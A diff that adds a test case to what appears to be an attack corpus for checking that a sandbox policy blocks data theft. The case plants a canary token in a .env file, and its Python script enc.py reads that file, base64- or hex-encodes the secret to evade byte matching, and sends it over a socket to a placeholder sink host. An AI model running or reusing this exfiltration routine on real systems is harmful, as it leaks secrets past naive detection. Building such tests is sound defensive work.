@@ -1,0 +1,41 @@
+# The secret is base64- or hex-encoded before it is sent, so a naive byte
+# search for the raw token would miss it. The policy blocks the connect
+# regardless of the payload's shape; the oracle's encodings double as a check
+# that a leak would be caught if the connect ever slipped through.
+# The `enc` variant feeds the {ENC} placeholder (see the corpus README).
+name = "encoded-exfil"
+kind = "attack"
+policy = "recommended"
+
+[variants]
+enc = ["base64", "hex"]
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "enc.py"
+contents = """
+import base64, binascii, socket
+secret = open(".env", "rb").read()
+enc = "{ENC}"
+if enc == "base64":
+    payload = base64.b64encode(secret)
+else:
+    payload = binascii.hexlify(secret)
+s = socket.socket()
+try:
+    s.connect(("{SINK_HOST}", {SINK_PORT}))
+    s.sendall(payload)
+except PermissionError:
+    pass
+"""
+
+[[steps]]
+shell = 0
+run = "python3 enc.py"
+expect = "any"
+
+[oracle]
+encodings = ["base64", "hex"]
